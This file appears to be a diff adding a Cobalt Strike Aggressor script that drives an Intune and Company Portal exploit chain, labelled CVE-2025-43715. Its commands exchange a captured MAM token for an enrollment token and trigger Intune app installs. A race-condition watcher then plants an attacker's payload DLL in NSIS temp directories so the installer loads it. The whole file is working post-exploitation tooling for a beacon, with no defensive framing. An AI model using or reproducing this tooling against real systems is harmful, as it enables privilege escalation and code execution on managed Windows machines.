@@ -1,0 +1,141 @@
+# Cobalt Strike Aggressor script for Company Portal Recon BOFs
+# CVE-2025-43715 NSIS race condition exploit chain
+
+
+# ---- intune-exchange ----
+
+beacon_command_register(
+    "intune-exchange",
+    "Exchange a MAM token for an Intune enrollment token.",
+    "INFO:\nExchange a MAM token for an Intune enrollment token via the\n" .
+    "TokenRenewalService. Auto-discovers host and device ID.\n\n" .
+    "USAGE:\nintune-exchange <mam-token> [host-override]\n\n" .
+    "EXAMPLES:\nintune-exchange eyJ0eXAi...\n" .
+    "intune-exchange eyJ0eXAi... fef.amsub0302.manage.microsoft.com\n");
+
+alias intune-exchange {
+    $bid = $1;
+    $token = $2;
+    $host = $3;
+
+    if ($token eq "") {
+        berror($bid, "Usage: intune-exchange <mam-token> [host-override]");
+        return;
+    }
+    if ($host eq "") {
+        $host = "";
+    }
+
+    $arch = barch($bid);
+    $handle = openf(script_resource("exchange/exchange." . $arch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "zz", $token, $host);
+    blog($bid, "[*] Exchanging MAM token...");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+
+# ---- intune-apps ----
+
+beacon_command_register(
+    "intune-apps",
+    "List, install, uninstall, or check status of Intune apps.",
+    "INFO:\nManage Intune apps via the IWService REST API.\n" .
+    "Auto-discovers host and device ID.\n\n" .
+    "USAGE:\nintune-apps <token> <list|status|install|uninstall> [app-guid] [host-override]\n\n" .
+    "EXAMPLES:\nintune-apps <token> list\n" .
+    "intune-apps <token> status 101bb1e7-...\n" .
+    "intune-apps <token> install 101bb1e7-...\n" .
+    "intune-apps <token> uninstall 101bb1e7-...\n");
+
+alias intune-apps {
+    $bid = $1;
+    $token = $2;
+    $cmd = $3;
+    $guid = $4;
+    $host = $5;
+
+    if ($token eq "" || $cmd eq "") {
+        berror($bid, "Usage: intune-apps <token> <list|status|install|uninstall> [app-guid] [host-override]");
+        return;
+    }
+    if ($cmd ne "list" && $cmd ne "status" && $cmd ne "install" && $cmd ne "uninstall") {
+        berror($bid, "Invalid command. Use: list, status, install, or uninstall");
+        return;
+    }
+    if ($cmd ne "list" && $guid eq "") {
+        berror($bid, "$cmd requires an app GUID");
+        return;
+    }
+    if ($guid eq "") { $guid = ""; }
+    if ($host eq "") { $host = ""; }
+
+    $arch = barch($bid);
+    $handle = openf(script_resource("apps/apps." . $arch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "zzzz", $token, $cmd, $guid, $host);
+    blog($bid, "[*] intune-apps $cmd ...");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+
+# ---- intune-race ----
+
+beacon_command_register(
+    "intune-race",
+    "Arm the NSIS race condition watcher (CVE-2025-43715).",
+    "INFO:\nArm a filesystem watcher on C:\\Windows\\Temp for NSIS temp dirs.\n" .
+    "Upload a payload DLL (x86) from the team server. When NSIS deletes a temp\n" .
+    "directory, the BOF recreates it and plants the payload before reuse.\n\n" .
+    "USAGE:\nintune-race <local-dll-path> [plugin-name] [timeout-sec]\n\n" .
+    "EXAMPLES:\nintune-race /opt/payloads/payload_test.dll\n" .
+    "intune-race /opt/payloads/payload_test.dll nsExec.dll 300\n\n" .
+    "NOTES:\n" .
+    "  The DLL must be x86 (32-bit). NSIS loads plugins with LoadLibrary.\n" .
+    "  The DLL is read from the team server and sent to the beacon in memory.\n" .
+    "  Arm the watcher BEFORE triggering the install with intune-apps.\n");
+
+alias intune-race {
+    $bid = $1;
+    $dll_path = $2;
+    $plugin = $3;
+    $timeout = $4;
+
+    if ($dll_path eq "") {
+        berror($bid, "Usage: intune-race <local-dll-path> [plugin-name] [timeout-sec]");
+        return;
+    }
+    if ($plugin eq "") {
+        $plugin = "nsExec.dll";
+    }
+    if ($timeout eq "") {
+        $timeout = 120;
+    }
+
+    $handle = openf($dll_path);
+    if ($handle is $null) {
+        berror($bid, "Cannot open DLL: $dll_path");
+        return;
+    }
+    $dll_bytes = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($dll_bytes) == 0) {
+        berror($bid, "DLL file is empty: $dll_path");
+        return;
+    }
+
+    $arch = barch($bid);
+    $bof_handle = openf(script_resource("race/race." . $arch . ".o"));
+    $bof_data = readb($bof_handle, -1);
+    closef($bof_handle);
+
+    # BOF expects: bzi (payload_bytes, plugin_name, timeout_sec)
+    $args = bof_pack($bid, "bzi", $dll_bytes, $plugin, $timeout);
+    blog($bid, "[*] Arming NSIS race watcher (" . strlen($dll_bytes) . " bytes, plugin: $plugin, timeout: $timeout" . "s)...");
+    beacon_inline_execute($bid, $bof_data, "go", $args);
+}
